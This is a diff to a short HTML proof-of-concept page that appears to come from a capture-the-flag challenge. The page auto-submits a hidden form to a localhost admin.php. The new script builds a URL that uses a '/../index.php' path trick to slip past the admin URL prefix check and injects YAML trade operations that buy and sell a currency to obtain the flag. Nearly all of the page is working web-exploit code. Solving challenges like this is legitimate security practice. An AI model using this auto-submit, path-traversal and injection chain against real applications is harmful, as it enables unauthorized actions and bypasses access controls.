@@ -1,14 +1,23 @@
 <!doctype html>
 <html>
+  <head><meta charset="utf-8"><title>poc</title></head>
   <body>
-    <!--
-      This page auto-submits to admin.php on the localhost server.
-      The hidden input 'url' points back to admin.php with transactions
-      encoded as GET params so admin.php in GET mode will emit YAML.
-    -->
     <form id="f" action="http://localhost:5000/admin.php" method="POST">
-      <input type="hidden" name="url" value="http://localhost:5000/admin.php?transactions%5B0%5D%5Bamount%5D=1&transactions%5B0%5D%5Bcountry%5D=FLAG">
+      <input type="hidden" name="url" id="u">
     </form>
-    <script>document.getElementById('f').submit();</script>
+
+    <script>
+      // Flow-style YAML (single line): buy XYZ (free), sell XYZ to get big balance,
+      // then buy 1 FL (flag currency).
+      const yaml = "[{amount: 1000000, currency: XYZ, op: BUY}, {amount: 1000000, currency: XYZ, op: SELL}, {amount: 1, currency: FL, op: BUY}]";
+
+      // This still starts with "http://localhost:5000/admin.php" so admin.php accepts it,
+      // but the path includes /../index.php so the server returns the raw yaml string
+      // (index.php prints the 'html' GET param) with no additional wrappers.
+      const target = "http://localhost:5000/admin.php/../index.php?html=" + encodeURIComponent(yaml);
+
+      document.getElementById('u').value = target;
+      document.getElementById('f').submit();
+    </script>
   </body>
 </html>
